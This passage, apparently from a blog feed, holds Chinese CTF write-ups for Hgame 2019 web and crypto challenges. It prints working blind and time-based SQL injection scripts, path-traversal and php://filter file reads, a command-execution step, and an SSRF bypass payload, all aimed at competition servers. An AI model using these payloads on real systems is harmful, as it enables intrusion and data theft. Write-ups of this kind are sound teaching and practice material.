class="string">'username'</span>:content1,</span><br><span class="line"><span class="string">'password'</span>:content2,</span><br><span class="line"><span class="string">'code'</span>:content3</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data,cookies=cookie)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>进去后发现直接是命令执行<br><img src="/images/2019-02-10-22-39-42.png" alt=""><br>读admin.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $cmd = (string)$_POST[<span class="string">'command'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;The Command is : $cmd &lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$cmd = str_replace(<span class="string">"flag"</span>,<span class="string">'none'</span>,$cmd);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Result is :"</span>;system($cmd); <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Login First')&lt;/script&gt;"</span>;</span><br><span class="line">    header(<span class="string">'Location: login.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /f?ag</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-10-22-39-26.png" alt=""></p><h3 id="sqli-1"><a href="#sqli-1" class="headerlink" title="sqli-1"></a>sqli-1</h3><p>简单写个脚本就完事了<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">res =<span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(str)</span>:</span></span><br><span class="line">    sha = hashlib.md5(str)</span><br><span class="line">    encrypts = sha.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> encrypts</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        url = <span class="string">'http://118.89.111.179:3000/'</span></span><br><span class="line">        cookie = &#123;</span><br><span class="line">            <span class="string">'PHPSESSID'</span>:<span class="string">'e3f4uv45jrf28l1sgksv7ofi17'</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,cookies=cookie)</span><br><span class="line">        md5str = r.content[<span class="number">35</span>:<span class="number">39</span>]</span><br><span class="line">        code = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000000</span>):</span><br><span class="line">            <span class="keyword">if</span> md5(str(i))[<span class="number">0</span>:<span class="number">4</span>] == md5str:</span><br><span class="line">                code = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        url2 = <span class="string">'http://118.89.111.179:3000/?code=%d&amp;id=%s'</span></span><br><span class="line">        <span class="comment"># payload = "1 and (ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='f1l1l1l1g'),%d,1))=%d)"</span></span><br><span class="line">        payload = <span class="string">"1 and (ascii(substr((select f14444444g from f1l1l1l1g limit 0,1),%d,1))=%d)"</span></span><br><span class="line">        payload = payload%(a,b)</span><br><span class="line">        url2 = url2%(code,payload)</span><br><span class="line">        r = requests.get(url2,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'welcome'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            res += chr(b)</span><br><span class="line">            <span class="keyword">print</span> res</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-10-20-21-11.png" alt=""><br>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;sql1_1s_iNterest1ng&#125;</span><br></pre></td></tr></table></figure></p><h3 id="sqli-2"><a href="#sqli-2" class="headerlink" title="sqli-2"></a>sqli-2</h3><p>换了个时间盲注而已……改下脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">res =<span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(str)</span>:</span></span><br><span class="line">    sha = hashlib.md5(str)</span><br><span class="line">    encrypts = sha.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> encrypts</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        url = <span class="string">'http://118.89.111.179:3001/'</span></span><br><span class="line">        cookie = &#123;</span><br><span class="line">            <span class="string">'PHPSESSID'</span>:<span class="string">'e3f4uv45jrf28l1sgksv7ofi17'</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,cookies=cookie)</span><br><span class="line">        md5str = r.content[<span class="number">79</span>:<span class="number">83</span>]</span><br><span class="line">        code = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000000</span>):</span><br><span class="line">            <span class="keyword">if</span> md5(str(i))[<span class="number">0</span>:<span class="number">4</span>] == md5str:</span><br><span class="line">                code = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        url2 = <span class="string">'http://118.89.111.179:3001/?code=%d&amp;id=%s'</span></span><br><span class="line">        <span class="comment">#payload = "1 and if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%d,1))=%d),sleep(5),1)"</span></span><br><span class="line">        <span class="comment">#payload = "1 and if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='F11111114G'),%d,1))=%d),sleep(5),1)"</span></span><br><span class="line">        payload = <span class="string">"1 and if((ascii(substr((select fL4444Ag from F11111114G limit 0,1),%d,1))=%d),sleep(5),1)"</span></span><br><span class="line">        payload = payload%(a,b)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url2 = url2%(code,payload)</span><br><span class="line">            r = requests.get(url2,cookies=cookie,timeout=<span class="number">4.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            res += chr(b)</span><br><span class="line">            <span class="keyword">print</span> res</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-10-20-59-51.png" alt=""><br>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125;</span><br></pre></td></tr></table></figure></p><h3 id="基础渗透"><a href="#基础渗透" class="headerlink" title="基础渗透"></a>基础渗透</h3><p>审计发现注入点，注入出文件名+phar://协议zip压缩包上传绕过getshell<br>注入脚本如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">res = <span class="string">"&lt;input type='hidden' value='(.*?)' id='token'"</span></span><br><span class="line">url = <span class="string">'http://111.231.140.29:10080/index.php'</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>:<span class="string">'92ld0o0vi9g4br2ltbpjeafvdr'</span>,</span><br><span class="line">    <span class="string">'user'</span>:<span class="string">'sky1224'</span>,</span><br><span class="line">    <span class="string">'groups'</span>:<span class="string">'0'</span></span><br><span class="line">&#125;</span><br><span class="line">url2 = <span class="string">'http://111.231.140.29:10080/messages_api.php?action=delete'</span></span><br><span class="line">url4 = <span class="string">'http://111.231.140.29:10080/messages_api.php?action=add'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="comment"># for j in range(33,127):</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        j = ord(j)</span><br><span class="line">        r = requests.get(url=url, cookies=cookie)</span><br><span class="line">        token = re.findall(res, r.content.decode(<span class="string">'utf-8'</span>))[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#payload = "-1 or if((ascii(substr((database()),%d,1))=%d),sleep(5),0)#"%(i,j)</span></span><br><span class="line">        payload = <span class="string">"-1 or if((ascii(substr((select avatar from users where username like 0x736b79736b79),%d,1))=%d),sleep(5),0)#"</span>%(i,j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'message_id'</span>:payload,</span><br><span class="line">            <span class="string">'token'</span>:token</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(data=data,cookies=cookie,url=url2,timeout=<span class="number">4.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            r = requests.get(url=url, cookies=cookie)</span><br><span class="line">            token = re.findall(res, r.content.decode(<span class="string">'utf-8'</span>))[<span class="number">0</span>]</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'new_message'</span>: <span class="string">'welcome sky'</span>,</span><br><span class="line">                <span class="string">'token'</span>: token</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(data=data,cookies=cookie,url=url4)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><h3 id="BabyXss"><a href="#BabyXss" class="headerlink" title="BabyXss"></a>BabyXss</h3><p>双写绕过<br><img src="/images/2019-02-10-21-50-24.png" alt=""><br><img src="/images/2019-02-10-22-03-08.png" alt=""></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="P4ndd-n"><a href="#P4ndd-n" class="headerlink" title="P4ndd!n@!"></a>P4ndd!n@!</h3><p>padding oracle攻击+cbc翻转攻击<br>padding oracle得到明文<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x0b\xdcubH\xc1X1-\xce\xf5\xbaC\xecO\xccIf you R Aris, I will give you flag.\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c</span><br></pre></td></tr></table></figure></p><p>再利用iv可控使解密结果等于Aris即可</p><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p>脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">12</span></span><br><span class="line">p = <span class="number">58380004430307803367806996460773123603790305789098384488952056206615768274527</span></span><br><span class="line">q = <span class="number">81859526975720060649380098193671612801200505029127076539457680155487669622867</span></span><br><span class="line">n=p*q</span><br><span class="line">c = <span class="number">206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d4 = libnum.invmod(<span class="number">3</span>,phi)</span><br><span class="line">m4 = pow(c,d4,n)</span><br><span class="line">m = gmpy.root(m4,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure></p><h3 id="basicmath"><a href="#basicmath" class="headerlink" title="basicmath"></a>basicmath</h3><p>简单解二次剩余，用sagemath即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> libnum.n2s(<span class="number">2328283218900523735008429328069252224650256765</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;神奇的MD5&quot;&gt;&lt;a href=&quot;#神奇的MD5&quot; class=&quot;headerlink&quot; title=&quot;神奇的MD5&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019-Hgame-Web-Week2</title>
    <link href="http://skysec.top/2019/02/05/2019-Hgame-Web-Week2/"/>
    <id>http://skysec.top/2019/02/05/2019-Hgame-Web-Week2/</id>
    <published>2019-02-05T11:47:53.000Z</published>
    <updated>2019-02-10T13:30:09.693Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>发现信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.25.25:9999/easyphp/robots.txt</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img/index.php</span><br></pre></td></tr></table></figure></p><p>访问得到<br><img src="/images/2019-02-05-19-48-54.png" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">'img'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">'1'</span>;</span><br><span class="line">    $img = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">".php"</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>发现可以文件读取，用<code>..././</code>绕过过滤<br>读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.25.25:9999/easyphp/img/index.php?img=..././flag</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maybe_you_should_think_think</span><br></pre></td></tr></table></figure></p><p>利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=..././flag</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKICAgIC8vJGZsYWcgPSAnaGdhbWV7WW91XzRyZV9Tb19nMG9kfSc7CiAgICBlY2hvICJtYXliZV95b3Vfc2hvdWxkX3RoaW5rX3RoaW5rIjsK</span><br></pre></td></tr></table></figure></p><p>即flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //$flag = &apos;hgame&#123;You_4re_So_g0od&#125;&apos;;</span><br><span class="line">    echo &quot;maybe_you_should_think_think&quot;;</span><br></pre></td></tr></table></figure></p><h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以说是非常简单的小技巧了<br>关于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以用0e开头md5和数组绕过<br>关于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以用<code>.</code>代替<code>_</code><br>关于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以用数组绕过<br>关于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以利用libcurl和parse_url解析顺序不同绕过，详见<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/</span><br></pre></td></tr></table></figure></p><p>最后得到payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.3.214:3001/?str1=QNKCDZO&amp;str2=240610708&amp;str3[]=1&amp;str4[]=2&amp;H.game[]=1&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php</span><br></pre></td></tr></table></figure></p><p>读到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]??<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>还是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p><p>即可得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $flag = 